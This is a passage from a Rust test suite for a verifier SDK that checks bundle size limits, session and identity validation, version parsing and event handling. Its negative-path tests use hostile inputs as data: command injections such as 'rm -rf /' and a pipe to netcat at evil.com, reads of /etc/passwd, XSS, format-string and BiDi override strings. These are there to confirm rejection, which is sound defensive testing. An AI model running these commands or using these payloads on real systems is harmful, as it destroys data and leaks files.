            VerifierSdkError::BundleTooLarge {
                actual_bytes,
                max_bytes,
            } => {
                assert_eq!(actual_bytes, bundle.len());
                assert_eq!(max_bytes, tight_cap);
            }
            other => panic!("expected BundleTooLarge under override, got {other:?}"),
        }
    }

    #[test]
    fn validate_bundle_clamps_config_override_to_absolute_ceiling() {
        // A hostile or fat-fingered operator config that asks for a cap above the
        // absolute ceiling must be silently clamped down rather than honored —
        // this is the fail-closed guarantee on the DoS surface.
        let mut sdk = create_verifier_sdk("verifier://alpha");
        sdk.config.insert(
            VERIFIER_SDK_MAX_BUNDLE_SIZE_BYTES_CONFIG_KEY.to_string(),
            (ABSOLUTE_MAX_BUNDLE_SIZE_BYTES.saturating_mul(2)).to_string(),
        );

        assert_eq!(
            sdk.resolved_max_bundle_size_bytes(),
            ABSOLUTE_MAX_BUNDLE_SIZE_BYTES,
            "config override above the absolute ceiling must clamp down, not widen"
        );
    }

    #[test]
    fn validate_bundle_unparseable_config_falls_back_to_default() {
        let mut sdk = create_verifier_sdk("verifier://alpha");
        sdk.config.insert(
            VERIFIER_SDK_MAX_BUNDLE_SIZE_BYTES_CONFIG_KEY.to_string(),
            "not-a-number".to_string(),
        );

        assert_eq!(
            sdk.resolved_max_bundle_size_bytes(),
            DEFAULT_MAX_BUNDLE_SIZE_BYTES,
            "unparseable config must fall back to the default cap, not disable the cap"
        );
    }

    #[test]
    fn validate_bundle_zero_config_rejects_all_bundles() {
        // An operator who explicitly wants to fail closed (e.g., during a
        // suspected attack) can set the cap to zero. Every non-empty bundle must
        // then surface BundleTooLarge.
        let mut sdk = create_verifier_sdk("verifier://alpha");
        sdk.config.insert(
            VERIFIER_SDK_MAX_BUNDLE_SIZE_BYTES_CONFIG_KEY.to_string(),
            "0".to_string(),
        );
        let bundle = make_replay_bundle_bytes("verifier://alpha");

        let err = sdk
            .validate_bundle(&bundle)
            .expect_err("zero-cap config must reject every non-empty bundle");

        assert!(
            matches!(err, VerifierSdkError::BundleTooLarge { max_bytes: 0, .. }),
            "expected BundleTooLarge with max_bytes=0, got {err:?}"
        );
    }

    #[test]
    fn validate_bundle_rejects_foreign_verifier_bundle() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let foreign_bundle = make_replay_bundle_bytes("verifier://beta");

        let err = sdk
            .validate_bundle(&foreign_bundle)
            .expect_err("foreign-verifier bundle must be rejected during validation");

        assert!(matches!(
            err,
            VerifierSdkError::SessionVerifierMismatch { .. }
        ));
    }

    #[test]
    fn verify_claim_rejects_whitespace_only_verifier_identity() {
        let sdk = create_verifier_sdk("   ");
        let capsule = capsule::build_reference_capsule();

        let err = sdk
            .verify_claim(&default_verifying_key(), &capsule)
            .expect_err("whitespace-only verifier identity must be rejected");

        assert!(matches!(
            err,
            VerifierSdkError::InvalidVerifierIdentity { .. }
        ));
    }

    #[test]
    fn validate_bundle_rejects_control_character_verifier_identity() {
        let sdk = create_verifier_sdk("verifier://alpha\u{0000}");
        let bundle = make_replay_bundle_bytes("verifier://alpha");

        let err = sdk
            .validate_bundle(&bundle)
            .expect_err("control-character verifier identity must be rejected");

        assert!(matches!(
            err,
            VerifierSdkError::InvalidVerifierIdentity { .. }
        ));
    }

    #[test]
    fn create_session_rejects_excessively_long_verifier_identity() {
        let sdk = create_verifier_sdk(format!(
            "verifier://{}",
            "a".repeat(MAX_VERIFIER_IDENTITY_NAME_LEN + 1)
        ));

        let err = sdk
            .create_session("session-too-long")
            .expect_err("excessively long verifier identity must be rejected");

        assert!(matches!(
            err,
            VerifierSdkError::InvalidVerifierIdentity { .. }
        ));
    }

    #[test]
    fn create_session_rejects_empty_session_id() {
        let sdk = create_verifier_sdk("verifier://alpha");

        let err = sdk
            .create_session("")
            .expect_err("empty session id must be rejected");

        assert!(matches!(err, VerifierSdkError::InvalidSessionId { .. }));
    }

    #[test]
    fn create_session_rejects_whitespace_padded_session_id() {
        let sdk = create_verifier_sdk("verifier://alpha");

        let err = sdk
            .create_session(" session-alpha ")
            .expect_err("whitespace-padded session id must be rejected");

        assert!(matches!(err, VerifierSdkError::InvalidSessionId { .. }));
    }

    #[test]
    fn execute_workflow_rejects_unsupported_sdk_before_bundle_guardrails() {
        let mut sdk = create_verifier_sdk("verifier://alpha");
        sdk.sdk_version = "vsdk-v0".to_string();
        let bundle = make_replay_bundle_bytes("verifier://alpha");

        let err = sdk
            .execute_workflow(ValidationWorkflow::ReleaseValidation, &bundle)
            .expect_err("unsupported sdk version must be rejected before workflow bundle checks");

        assert_eq!(
            err,
            VerifierSdkError::UnsupportedSdk(format!(
                "{}: requested=vsdk-v0, supported={}",
                ERR_SDK_VERSION_UNSUPPORTED, SDK_VERSION
            ))
        );
    }

    #[test]
    fn create_session_rejects_control_character_session_id() {
        let sdk = create_verifier_sdk("verifier://alpha");

        let err = sdk
            .create_session("session-\u{0000}-alpha")
            .expect_err("control-character session id must be rejected");

        assert!(matches!(err, VerifierSdkError::InvalidSessionId { .. }));
    }

    #[test]
    fn record_session_step_rejects_mutated_invalid_session_id() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let mut session = sdk
            .create_session("session-alpha")
            .expect("valid session should be created");
        session.session_id = "session-\nalpha".to_string();
        let result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("result should build");

        let err = sdk
            .record_session_step(&mut session, &result)
            .expect_err("mutated invalid session id must be rejected");

        assert!(matches!(err, VerifierSdkError::InvalidSessionId { .. }));
    }

    #[test]
    fn record_session_step_rejects_tampered_session_nonce() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let mut session = sdk
            .create_session("session-alpha")
            .expect("valid session should be created");
        session.session_nonce = "forged-session-nonce".to_string();
        let result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("result should build");

        let err = sdk
            .record_session_step(&mut session, &result)
            .expect_err("tampered session nonce must be rejected");

        assert!(matches!(
            err,
            VerifierSdkError::SessionProvenanceMismatch {
                field: "session_nonce",
                ..
            }
        ));
        assert!(session.steps().is_empty());
    }

    #[test]
    fn seal_session_rejects_tampered_session_nonce() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let mut session = sdk
            .create_session("session-alpha")
            .expect("valid session should be created");
        session.session_nonce = "forged-session-nonce".to_string();

        let err = sdk
            .seal_session(&mut session)
            .expect_err("tampered session nonce must be rejected");

        assert!(matches!(
            err,
            VerifierSdkError::SessionProvenanceMismatch {
                field: "session_nonce",
                ..
            }
        ));
        assert!(!session.sealed);
        assert!(session.final_verdict.is_none());
    }

    #[test]
    fn test_cryptographic_posture_markers_defined() {
        assert_eq!(
            CRYPTOGRAPHIC_SECURITY_POSTURE,
            "cryptographic_ed25519_authenticated"
        );
        assert_eq!(
            STRUCTURAL_ONLY_RULE_ID,
            "VERIFIER_SHORTCUT_GUARD::WORKSPACE_VERIFIER_SDK"
        );
    }

    #[test]
    fn test_check_sdk_version_supported() {
        assert!(check_sdk_version("vsdk-v1.0").is_ok());
    }

    #[test]
    fn test_check_sdk_version_unsupported() {
        let err = check_sdk_version("vsdk-v99.0");
        assert!(err.is_err());
        assert!(err.unwrap_err().contains(ERR_SDK_VERSION_UNSUPPORTED));
    }

    #[test]
    fn test_event_codes_defined() {
        assert_eq!(CAPSULE_CREATED, "CAPSULE_CREATED");
        assert_eq!(CAPSULE_SIGNED, "CAPSULE_SIGNED");
        assert_eq!(CAPSULE_REPLAY_START, "CAPSULE_REPLAY_START");
        assert_eq!(CAPSULE_VERDICT_REPRODUCED, "CAPSULE_VERDICT_REPRODUCED");
        assert_eq!(SDK_VERSION_CHECK, "SDK_VERSION_CHECK");
        assert_eq!(
            FN_LTV_VERIFY_AS_OF_COMPLETED,
            "FN_LTV_VERIFY_AS_OF_COMPLETED"
        );
        assert_eq!(
            FN_LTV_WITNESS_ANTERIORITY_PROVEN,
            "FN_LTV_WITNESS_ANTERIORITY_PROVEN"
        );
        assert_eq!(FN_LTV_BACKDATING_REJECTED, "FN_LTV_BACKDATING_REJECTED");
        assert_eq!(
            FN_LTV_HYBRID_SURVIVED_ALGO_DEATH,
            "FN_LTV_HYBRID_SURVIVED_ALGO_DEATH"
        );
    }

    #[test]
    fn test_error_codes_defined() {
        assert_eq!(
            ERR_CAPSULE_SIGNATURE_INVALID,
            "ERR_CAPSULE_SIGNATURE_INVALID"
        );
        assert_eq!(ERR_CAPSULE_SCHEMA_MISMATCH, "ERR_CAPSULE_SCHEMA_MISMATCH");
        assert_eq!(ERR_CAPSULE_REPLAY_DIVERGED, "ERR_CAPSULE_REPLAY_DIVERGED");
        assert_eq!(ERR_CAPSULE_VERDICT_MISMATCH, "ERR_CAPSULE_VERDICT_MISMATCH");
        assert_eq!(ERR_SDK_VERSION_UNSUPPORTED, "ERR_SDK_VERSION_UNSUPPORTED");
        assert_eq!(ERR_CAPSULE_ACCESS_DENIED, "ERR_CAPSULE_ACCESS_DENIED");
    }

    #[test]
    fn test_invariant_codes_defined() {
        assert_eq!(INV_CAPSULE_STABLE_SCHEMA, "INV-CAPSULE-STABLE-SCHEMA");
        assert_eq!(INV_CAPSULE_VERSIONED_API, "INV-CAPSULE-VERSIONED-API");
        assert_eq!(
            INV_CAPSULE_NO_PRIVILEGED_ACCESS,
            "INV-CAPSULE-NO-PRIVILEGED-ACCESS"
        );
        assert_eq!(
            INV_CAPSULE_VERDICT_REPRODUCIBLE,
            "INV-CAPSULE-VERDICT-REPRODUCIBLE"
        );
    }

    #[test]
    fn test_sdk_event_new() {
        let evt = SdkEvent::new(CAPSULE_CREATED, "test capsule created");
        assert_eq!(evt.event_code, CAPSULE_CREATED);
        assert_eq!(evt.detail, "test capsule created");
    }

    #[test]
    fn test_sdk_event_clone() {
        let evt = SdkEvent::new(CAPSULE_SIGNED, "signed");
        let cloned = evt.clone();
        assert_eq!(cloned.event_code, evt.event_code);
        assert_eq!(cloned.detail, evt.detail);
    }

    #[test]
    fn test_sdk_event_debug() {
        let evt = SdkEvent::new(SDK_VERSION_CHECK, "version check");
        let debug = format!("{:?}", evt);
        assert!(debug.contains("SDK_VERSION_CHECK"));
    }

    // ── Negative-path tests for edge cases and invalid inputs ──────────

    #[test]
    fn negative_check_sdk_version_with_empty_and_whitespace_rejects() {
        // Empty version string should be rejected
        let result = check_sdk_version("");
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
        assert!(err.contains("requested=, supported="));

        // Whitespace-only version should be rejected
        let result2 = check_sdk_version("   ");
        assert!(result2.is_err());
        let err2 = result2.unwrap_err();
        assert!(err2.contains(ERR_SDK_VERSION_UNSUPPORTED));

        // Tabs and newlines should be rejected
        let result3 = check_sdk_version("\t\n\r");
        assert!(result3.is_err());
        let err3 = result3.unwrap_err();
        assert!(err3.contains(ERR_SDK_VERSION_UNSUPPORTED));
    }

    #[test]
    fn negative_check_sdk_version_with_malformed_version_strings_rejects() {
        let invalid_versions = vec![
            "v1.0",            // Missing vsdk prefix
            "vsdk-v",          // Missing version number
            "vsdk-v1",         // Missing patch version
            "vsdk-v1.",        // Incomplete version
            "vsdk-v1.0.0",     // Too many version parts
            "VSDK-V1.0",       // Wrong case
            "vsdk-v1.0-beta",  // Pre-release suffix
            "vsdk-v1.0+build", // Build metadata
            "vsdk-v01.0",      // Leading zeros
            "vsdk-v-1.0",      // Negative version
        ];

        for version in invalid_versions {
            let result = check_sdk_version(version);
            assert!(result.is_err(), "Version '{}' should be rejected", version);
            let err = result.unwrap_err();
            assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
            assert!(err.contains(&format!("requested={}", version)));
        }
    }

    #[test]
    fn negative_check_sdk_version_with_unicode_and_control_characters_rejects() {
        let problematic_versions = vec![
            "vsdk-v1\0.0",       // Null byte
            "vsdk-v1\x01.0",     // Control character
            "vsdk-v1🚀.0",       // Emoji
            "vsdk-v1\u{FFFF}.0", // Max BMP character
            "vsdk-v1.0\n",       // Trailing newline
            "\u{200B}vsdk-v1.0", // Zero-width space prefix
            "vsdk-v1.0\u{00A0}", // Non-breaking space suffix
        ];

        for version in problematic_versions {
            let result = check_sdk_version(version);
            assert!(result.is_err(), "Version '{}' should be rejected", version);
            let err = result.unwrap_err();
            assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));

            // Error message should safely contain the problematic version
            assert!(err.contains("requested="));
        }
    }

    #[test]
    fn negative_check_sdk_version_with_extremely_long_strings_handles_efficiently() {
        // Very long version string should be rejected efficiently
        let long_version = "vsdk-v1.0-".to_string() + &"x".repeat(100_000);

        let start_time = std::time::Instant::now();
        let result = check_sdk_version(&long_version);
        let duration = start_time.elapsed();

        assert!(result.is_err());

        // Should complete quickly despite long input (within 100ms)
        assert!(
            duration < std::time::Duration::from_millis(100),
            "Version check took too long: {:?}",
            duration
        );

        // Error message should truncate or handle long input safely
        let err = result.unwrap_err();
        assert!(
            err.len() < 200_000,
            "Error message should not be excessively long"
        );
    }

    #[test]
    fn negative_sdk_event_with_control_characters_and_large_details_handles_safely() {
        // Test SdkEvent with various problematic detail strings
        let problematic_details = vec![
            String::new(),                          // Empty detail
            "\0null\x01control\x7fchars".into(),    // Control characters
            "detail\nwith\nnewlines".into(),        // Multiline content
            "🚀🔥💀".into(),                        // Unicode emoji
            "\u{FFFF}\u{10FFFF}".into(),            // Max Unicode codepoints
            "x".repeat(10_000),                     // Very long detail
            "{\"malicious\": \"json\"}".into(),     // Potential JSON injection
            "<script>alert('xss')</script>".into(), // Potential XSS
            "../../etc/passwd".into(),              // Path traversal pattern
        ];

        for detail in problematic_details {
            let event = SdkEvent::new(CAPSULE_CREATED, detail.clone());

            // Event creation should succeed regardless of content
            assert_eq!(event.event_code, CAPSULE_CREATED);
            assert_eq!(event.detail, detail);

            // Debug formatting should not panic
            let debug_output = format!("{:?}", event);
            assert!(debug_output.contains("CAPSULE_CREATED"));

            // Clone should work with problematic content
            let cloned = event.clone();
            assert_eq!(cloned.detail, detail);
        }
    }

    #[test]
    fn negative_sdk_event_with_borrowed_string_types_converts_correctly() {
        // Test SdkEvent::new with various string-like types
        let string_owned = String::from("owned_string");
        let string_ref = "string_reference";
        let string_slice: &str = &string_owned[0..5]; // "owned"

        let event1 = SdkEvent::new(CAPSULE_SIGNED, string_owned.clone());
        let event2 = SdkEvent::new(CAPSULE_SIGNED, string_ref);
        let event3 = SdkEvent::new(CAPSULE_SIGNED, string_slice);

        assert_eq!(event1.detail, "owned_string");
        assert_eq!(event2.detail, "string_reference");
        assert_eq!(event3.detail, "owned");

        // Test with empty string slice
        let empty_slice: &str = &string_owned[0..0];
        let event4 = SdkEvent::new(CAPSULE_SIGNED, empty_slice);
        assert_eq!(event4.detail, "");
    }

    #[test]
    fn negative_version_check_error_message_formatting_with_special_characters() {
        // Test that error message formatting handles special characters safely
        let versions_with_format_specifiers = vec![
            "vsdk-%s",               // Printf format specifier
            "vsdk-{placeholder}",    // Rust format placeholder
            "vsdk-v1.0%",            // Percent character
            "vsdk-v1.0\\n",          // Escape sequences
            "vsdk-v1.0\"quoted\"",   // Quote characters
            "vsdk-v1.0'apostrophe'", // Apostrophe
        ];

        for version in versions_with_format_specifiers {
            let result = check_sdk_version(version);
            assert!(result.is_err());

            let err = result.unwrap_err();

            // Error should contain the expected format without interpretation
            assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
            assert!(err.contains(&format!("requested={}", version)));
            assert!(err.contains("supported=vsdk-v1.0"));

            // Error message should not interpret format specifiers
            assert!(!err.contains("(null)")); // Common printf error
            assert!(!err.contains("Error")); // Shouldn't expand placeholders
        }
    }

    #[test]
    fn negative_constants_immutability_and_correctness_verified() {
        // Verify that constants have expected values and cannot be modified

        // Version constants should be consistent
        assert_eq!(SDK_VERSION, "vsdk-v1.0");
        assert_eq!(SDK_VERSION_MIN, "vsdk-v1.0");
        assert!(SDK_VERSION.starts_with("vsdk-v"));
        assert!(SDK_VERSION_MIN.starts_with("vsdk-v"));

        // Security posture constants should be defined
        assert!(!CRYPTOGRAPHIC_SECURITY_POSTURE.is_empty());
        assert!(!STRUCTURAL_ONLY_RULE_ID.is_empty());
        assert!(CRYPTOGRAPHIC_SECURITY_POSTURE.contains("cryptographic_ed25519"));
        assert!(STRUCTURAL_ONLY_RULE_ID.contains("VERIFIER_SHORTCUT_GUARD"));

        // Event codes should follow expected patterns
        let event_codes = [
            CAPSULE_CREATED,
            CAPSULE_SIGNED,
            CAPSULE_REPLAY_START,
            CAPSULE_VERDICT_REPRODUCED,
            SDK_VERSION_CHECK,
            FN_LTV_VERIFY_AS_OF_COMPLETED,
            FN_LTV_WITNESS_ANTERIORITY_PROVEN,
            FN_LTV_BACKDATING_REJECTED,
            FN_LTV_HYBRID_SURVIVED_ALGO_DEATH,
        ];
        for code in &event_codes {
            assert!(!code.is_empty());
            assert!(code.is_ascii(), "Event code should be ASCII: {}", code);
        }

        // Error codes should follow ERR_ prefix pattern
        let error_codes = [
            ERR_CAPSULE_SIGNATURE_INVALID,
            ERR_CAPSULE_SCHEMA_MISMATCH,
            ERR_CAPSULE_REPLAY_DIVERGED,
            ERR_CAPSULE_VERDICT_MISMATCH,
            ERR_SDK_VERSION_UNSUPPORTED,
            ERR_CAPSULE_ACCESS_DENIED,
        ];
        for code in &error_codes {
            assert!(
                code.starts_with("ERR_"),
                "Error code should start with ERR_: {}",
                code
            );
            assert!(code.is_ascii(), "Error code should be ASCII: {}", code);
        }

        // Invariant codes should follow INV- prefix pattern
        let invariant_codes = [
            INV_CAPSULE_STABLE_SCHEMA,
            INV_CAPSULE_VERSIONED_API,
            INV_CAPSULE_NO_PRIVILEGED_ACCESS,
            INV_CAPSULE_VERDICT_REPRODUCIBLE,
        ];
        for code in &invariant_codes {
            assert!(
                code.starts_with("INV-"),
                "Invariant code should start with INV-: {}",
                code
            );
            assert!(
                code.contains("CAPSULE"),
                "Invariant should relate to capsules: {}",
                code
            );
        }
    }

    #[test]
    fn negative_memory_safety_with_recursive_string_construction() {
        // Test that SdkEvent and version checking don't cause memory issues
        // with potentially recursive or self-referential string construction

        let mut detail = String::from("base");

        // Build up a moderately complex string without excessive memory use
        for i in 0..100 {
            detail = format!("{}_{}", detail, i);

            let event = SdkEvent::new(CAPSULE_CREATED, detail.clone());
            assert_eq!(event.detail, detail);

            // Memory usage should be reasonable
            if detail.len() > 10_000 {
                break; // Prevent excessive test runtime
            }
        }

        // Final event should work with complex detail
        let final_event = SdkEvent::new(CAPSULE_VERDICT_REPRODUCED, detail);
        assert!(!final_event.detail.is_empty());
        assert!(final_event.detail.contains("base"));
    }

    // ── Additional comprehensive negative-path tests ──

    #[test]
    fn negative_sdk_version_check_with_integer_overflow_patterns() {
        // Test version strings that could cause integer overflow in parsing
        let overflow_versions = vec![
            "vsdk-v18446744073709551615.0".to_string(), // u64::MAX
            "vsdk-v999999999999999999.0".to_string(),   // Large number
            "vsdk-v1.18446744073709551615".to_string(), // u64::MAX as minor
            "vsdk-v1.999999999999999999".to_string(),   // Large minor number
            "vsdk-v0.4294967295".to_string(),           // u32::MAX as minor
            format!("vsdk-v{}.0", i64::MAX),            // i64::MAX
            format!("vsdk-v{}.0", u128::MAX),           // u128::MAX (would be huge)
        ];

        for version in overflow_versions {
            let result = check_sdk_version(&version);
            assert!(
                result.is_err(),
                "Version with potential overflow should be rejected: {}",
                version
            );

            let err = result.unwrap_err();
            assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));

            // Error message should be safely bounded even with large numbers
            assert!(
                err.len() < 1000,
                "Error message should not be excessively long for version: {}",
                version
            );
        }
    }

    #[test]
    fn negative_sdk_event_concurrent_access_stress_test() {
        // Test SdkEvent under concurrent access patterns (single-threaded simulation)
        use std::cell::RefCell;
        use std::rc::Rc;

        let shared_detail = Rc::new(RefCell::new(String::from("concurrent_test")));
        let mut events = Vec::new();

        // Simulate concurrent-like access patterns
        for i in 0..1000 {
            // Modify shared string
            {
                let mut detail = shared_detail.borrow_mut();
                detail.push_str(&format!("_{}", i % 10));
            }

            // Create event with snapshot of current state
            let detail_snapshot = shared_detail.borrow().clone();
            let event = SdkEvent::new(CAPSULE_CREATED, detail_snapshot.clone());

            assert_eq!(event.event_code, CAPSULE_CREATED);
            assert_eq!(event.detail, detail_snapshot);

            events.push(event);

            // Verify earlier events haven't been affected
            if i > 0 {
                let first_event = &events[0];
                assert_eq!(first_event.event_code, CAPSULE_CREATED);
                assert!(first_event.detail.starts_with("concurrent_test"));
            }
        }

        assert_eq!(events.len(), 1000);

        // Verify all events are independently stored
        for event in &events {
            assert!(event.detail.contains("concurrent_test"));
            let cloned = event.clone();
            assert_eq!(cloned.detail, event.detail);
        }
    }

    #[test]
    fn negative_version_check_with_null_byte_and_binary_data() {
        // Test version strings containing null bytes and binary data
        let binary_versions = vec![
            "vsdk-v1\x00.0".to_string(),              // Null byte in middle
            "\x00vsdk-v1.0".to_string(),              // Null byte at start
            "vsdk-v1.0\x00".to_string(),              // Null byte at end
            "vsdk-v1\u{FF}\u{FE}.0".to_string(),      // Binary data (BOM-like)
            "vsdk-v1.\u{80}\u{81}\u{82}".to_string(), // High-bit bytes
            String::from_utf8_lossy(&[118, 115, 100, 107, 45, 118, 49, 0, 46, 48]).into_owned(), // Null in UTF-8
        ];

        for version in binary_versions {
            let result = check_sdk_version(&version);
            assert!(
                result.is_err(),
                "Binary data version should be rejected: {:?}",
                version.as_bytes()
            );

            let err = result.unwrap_err();
            assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));

            // Error should safely handle binary data in output
            assert!(err.contains("requested="));
            assert!(err.contains("supported=vsdk-v1.0"));
        }
    }

    #[test]
    fn negative_sdk_event_detail_with_extreme_unicode_edge_cases() {
        // Test SdkEvent with Unicode edge cases that could cause issues
        let unicode_edge_cases = vec![
            "\u{0}",                              // Null character as Unicode
            "\u{FFFF}",                           // Maximum BMP character
            "\u{10FFFF}",                         // Maximum Unicode codepoint
            r#"\uD800"#,                          // Raw string with high surrogate escape
            r#"\uDFFF"#,                          // Raw string with low surrogate escape
            "\u{1F4A9}\u{200D}\u{1F525}",         // Complex emoji sequence
            "\u{0301}\u{0302}\u{0303}",           // Combining characters only
            "a\u{0300}\u{0301}\u{0302}\u{0303}b", // Heavily accented character
            "\u{202E}reverse\u{202D}text",        // BiDi override characters
            "\u{FEFF}BOM\u{FEFF}marker",          // Byte order marks
        ];

        for (idx, detail) in unicode_edge_cases.into_iter().enumerate() {
            let event = SdkEvent::new(CAPSULE_SIGNED, detail);

            assert_eq!(event.event_code, CAPSULE_SIGNED);
            assert_eq!(event.detail, detail);

            // Debug output should be safe
            let debug_output = format!("{:?}", event);
            assert!(debug_output.contains("CAPSULE_SIGNED"));

            // Clone should preserve Unicode data exactly
            let cloned = event.clone();
            assert_eq!(cloned.detail.len(), detail.len());
            assert_eq!(cloned.detail, detail);

            // Converting to bytes and back should be stable
            let detail_bytes = event.detail.as_bytes();
            let roundtrip = String::from_utf8_lossy(detail_bytes);
            assert_eq!(
                roundtrip, detail,
                "Unicode roundtrip failed for case {}: {:?}",
                idx, detail
            );
        }
    }

    #[test]
    fn negative_version_string_with_path_traversal_injection_attempts() {
        // Test version strings that look like path traversal or injection attempts
        let injection_attempts = vec![
            "../vsdk-v1.0",                 // Path traversal up
            "vsdk-v1.0/../",                // Path traversal suffix
            "./vsdk-v1.0",                  // Current directory prefix
            "vsdk-v1.0/../../etc/passwd",   // Deep path traversal
            "file:///vsdk-v1.0",            // File URI scheme
            "http://evil.com/vsdk-v1.0",    // HTTP URL
            "$(echo vsdk-v1.0)",            // Command injection
            "`cat /etc/passwd`",            // Backtick injection
            "${USER}vsdk-v1.0",             // Variable expansion
            "vsdk-v1.0; rm -rf /",          // Command chaining
            "vsdk-v1.0 && echo pwned",      // Command AND
            "vsdk-v1.0 | nc evil.com 9999", // Pipe to netcat
            "vsdk-v1.0\nrm -rf /",          // Newline injection
        ];

        for injection in injection_attempts {
            let result = check_sdk_version(injection);
            assert!(
                result.is_err(),
                "Injection attempt should be rejected: {}",
                injection
            );

            let err = result.unwrap_err();
            assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
            assert!(err.contains(&format!("requested={}", injection)));

            // Should safely include the rejected input literally.
            assert!(err.contains("supported=vsdk-v1.0"));
        }
    }

    #[test]
    fn negative_sdk_event_with_format_string_attack_patterns() {
        // Test SdkEvent with format string attack patterns
        let format_attacks = vec![
            "%s%s%s%s%s%s",          // Multiple format specs
            "%x%x%x%x%x%x%x",        // Hex dump attempts
            "%08x.%08x.%08x.%08x",   // Stack reading pattern
            "{}{}{}{}{}{}",          // Rust format braces
            "{0}{1}{2}{3}",          // Indexed format
            "%n%n%n%n%n",            // Write attempts (C)
            "\\x41\\x42\\x43",       // Hex escape sequences
            "\\u0041\\u0042\\u0043", // Unicode escapes
            "\\\\n\\\\t\\\\r",       // Escape sequence attempts
            "%p%p%p%p%p",            // Pointer dumping
        ];

        for pattern in format_attacks {
            let event = SdkEvent::new(CAPSULE_REPLAY_START, pattern);

            assert_eq!(event.event_code, CAPSULE_REPLAY_START);
            assert_eq!(event.detail, pattern); // Should be stored literally

            // Debug output should not interpret format specifiers
            let debug_output = format!("{:?}", event);
            assert!(debug_output.contains("CAPSULE_REPLAY_START"));
            assert!(!debug_output.contains("(null)")); // Common printf error
            assert!(!debug_output.contains("0x")); // Shouldn't expand hex

            // Clone should preserve attack string exactly
            let cloned = event.clone();
            assert_eq!(cloned.detail, pattern);

            // String should not be interpreted during any operations
            assert_eq!(cloned.detail.len(), pattern.len());
        }
    }

    #[test]
    fn negative_extreme_memory_pressure_simulation() {
        // Test behavior under simulated extreme memory pressure
        let mut large_events = Vec::new();
        let base_detail = "memory_pressure_test_".to_string();

        // Create progressively larger event details
        for i in 0..100 {
            let size_multiplier = 1 << (i % 10); // Powers of 2, cycling
            let large_detail = base_detail.repeat(size_multiplier);

            let event = SdkEvent::new(CAPSULE_VERDICT_REPRODUCED, large_detail.clone());

            // Event should be created successfully
            assert_eq!(event.event_code, CAPSULE_VERDICT_REPRODUCED);
            assert_eq!(event.detail.len(), large_detail.len());

            large_events.push(event);

            // Break if we've created very large strings to avoid test timeouts
            if large_detail.len() > 100_000 {
                break;
            }
        }

        // Verify all events are still accessible and correct
        for event in &large_events {
            assert!(event.detail.starts_with("memory_pressure_test_"));
            assert_eq!(event.event_code, CAPSULE_VERDICT_REPRODUCED);

            // Clone should work even with large details
            let cloned = event.clone();
            assert_eq!(cloned.detail.len(), event.detail.len());
        }

        // Test version checking with large strings too
        let huge_version = "vsdk-v1.0-".to_string() + &"x".repeat(50_000);
        let result = check_sdk_version(&huge_version);
        assert!(result.is_err());

        let err = result.unwrap_err();
        assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
        // Should complete without hanging or crashing
    }

    #[test]
    fn negative_boundary_condition_testing_at_string_limits() {
        // Test boundary conditions around string size and content limits

        // Test with maximum reasonable event detail size
        let max_detail = "x".repeat(65536); // 64KB detail
        let max_event = SdkEvent::new(SDK_VERSION_CHECK, max_detail.clone());
        assert_eq!(max_event.detail.len(), 65536);
        assert_eq!(max_event.detail, max_detail);

        // Test empty strings
        let empty_event = SdkEvent::new(CAPSULE_CREATED, "");
        assert_eq!(empty_event.detail, "");
        assert!(empty_event.detail.is_empty());

        // Test single character
        let single_char_event = SdkEvent::new(CAPSULE_SIGNED, "x");
        assert_eq!(single_char_event.detail, "x");
        assert_eq!(single_char_event.detail.len(), 1);

        // Test version boundary conditions
        assert!(check_sdk_version("vsdk-v1.0").is_ok()); // Exact match
        assert!(check_sdk_version("vsdk-v1.1").is_err()); // Close but wrong
        assert!(check_sdk_version("vsdk-v0.9").is_err()); // Close but wrong
        assert!(check_sdk_version("vsdk-v").is_err()); // Missing version
        assert!(check_sdk_version("vsdk-").is_err()); // Missing v prefix
        assert!(check_sdk_version("sdk-v1.0").is_err()); // Missing vs prefix

        // Test boundary around supported version
        let slightly_off_versions = vec![
            "vsdk-v1.0 ",  // Trailing space
            " vsdk-v1.0",  // Leading space
            "vsdk-v1.0\0", // Null terminator
            "vsdk-v1.0\n", // Newline terminator
            "vsdk-v1.0\r", // Carriage return
            "vsdk-v1.0\t", // Tab character
        ];

        for version in slightly_off_versions {
            assert!(
                check_sdk_version(version).is_err(),
                "Slightly malformed version should be rejected: {:?}",
                version
            );
        }
    }

    // ── Extreme adversarial negative-path tests ──

    #[test]
    fn extreme_adversarial_unicode_bidirectional_override_injection_in_event_details() {
        // Extreme: Unicode bidirectional override attacks in event details
        let bidi_attack_patterns = [
            // Right-to-left override sequences that could manipulate display
            format!("normal{}evil{}", "\u{202E}", "\u{202D}"), // RLE + PDF
            format!("safe{}hidden{}visible", "\u{2066}", "\u{2069}"), // FSI + PDI
            format!("text{}rtl{}end", "\u{200F}", "\u{200E}"), // RLM + LRM
            format!("{}arabic{}", "\u{061C}", "\u{202C}"),     // ALM + PDF
            // Nested bidirectional overrides
            format!(
                "{}a{}b{}c{}",
                "\u{202E}", "\u{2066}", "\u{2069}", "\u{202D}"
            ),
            // Mixed with zero-width characters
            format!(
                "{}{}attack{}{}",
                "\u{202E}", "\u{200B}", "\u{200C}", "\u{202D}"
            ),
        ];

        for malicious_detail in &bidi_attack_patterns {
            let event = SdkEvent::new(CAPSULE_CREATED, malicious_detail.clone());

            // Should store BiDi characters without interpretation or corruption
